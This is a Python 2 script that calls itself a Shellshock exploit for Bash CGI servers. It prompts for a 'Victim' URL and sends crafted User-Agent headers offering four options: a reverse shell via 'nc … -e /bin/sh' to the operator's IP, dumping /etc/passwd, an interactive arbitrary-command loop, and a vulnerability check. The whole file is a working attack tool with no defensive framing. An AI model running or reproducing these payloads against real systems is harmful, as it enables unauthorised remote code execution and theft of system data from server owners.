#!/usr/bin/env python
# -*- coding: utf-8 -*-

from subprocess import call
import urllib
import urllib2
import re

print """
		
	eScShock / BASH(CGİ) ShellShock Exploit
"""

sec  = "(1)Reverse Shell"
sec2 = "(2)/etc/passwd"
sec3 = "(3)Command Process"
sec4 = "(4)Vuln Control\n"

print sec
print sec2
print sec3
print sec4


sec_in = int(raw_input("Action! : "))

if sec_in > 4:
	
	print "Oh No! "
	quit()

elif sec_in == 4:

	print "<<<Vuln Control>>>\n"

	test = raw_input("Victim : ")

	urllib.FancyURLopener.version = "() { :; }; echo;/bin/bash -c uname -a "
	ac   = urllib.FancyURLopener({})
	say  = ac.open(test)
	if 'Linux' in say.read():
		print "VULNERABLE!"
		quit()
	else:
		print "Not Vulnerable..)"
		quit()


elif sec_in == 1:
	print "<Usage   : http://127.0.0.1/cgi/ , http://127.0.0.1/cgi-bin/cgi>"
	print "<Default : nc -lvp 31337>"
	url = raw_input("Victim: ")
	ip = raw_input("Local İp: ")
	if not url or not ip:
		print " Byy "
		quit()
	
	user_agent = {'User-Agent':"() { :; }; /bin/bash -c 'nc %s 31337 -e /bin/sh'" %ip}
	open = urllib2.Request(url, headers=user_agent)
	dene = urllib2.urlopen(open)
	quit()
	
	

elif sec_in == 2:
        
	url = raw_input("Victim: ")
	user_agent = {'User-Agent':"() { :; }; echo;/bin/cat /etc/passwd"}
	open = urllib2.Request(url, headers=user_agent)
	dene = urllib2.urlopen(open)
	yaz = dene.read()
	print "/etc/passwd \n : ", yaz
	quit()
	if not url:
		print " Byy "
		quit()
	


elif sec_in == 3:

	url = raw_input("Victim: ")
	if not url:
		print " Byy "
		quit()
	
while True:
    cmd = raw_input("Commcand : ")
    user_agent = {'User-Agent':"() { :; }; echo;/bin/bash -c %s " %cmd}
    open = urllib2.Request(url, headers=user_agent)
    dene = urllib2.urlopen(open)
    yaz = dene.read()
    print yaz
    
if cmd == "exit":
	quit()
